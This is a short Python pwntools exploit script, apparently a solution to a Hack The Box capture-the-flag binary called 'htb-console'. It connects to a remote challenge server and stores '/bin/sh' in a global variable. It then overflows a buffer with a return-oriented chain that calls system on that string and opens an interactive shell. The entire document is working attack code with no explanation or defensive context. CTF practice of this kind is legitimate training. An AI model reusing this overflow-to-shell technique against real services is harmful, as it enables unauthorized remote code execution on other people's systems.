from pwn import *

context.binary = exe = ELF('./htb-console')

global_var = 0x4040b0
pop_rdi = 0x401473

# io = process()
# gdb.attach(io, api=True)
io = remote('206.189.24.162', 30211)

io.sendlineafter(b'>> ', b'hof')
io.sendlineafter(b'name: ', b'/bin/sh\0')

io.sendlineafter(b'>> ', b'flag')
payload = b'i'*0x18 + p64(pop_rdi) + p64(global_var) + p64(exe.plt['system'])
io.sendlineafter(b'flag: ', payload)

io.interactive()
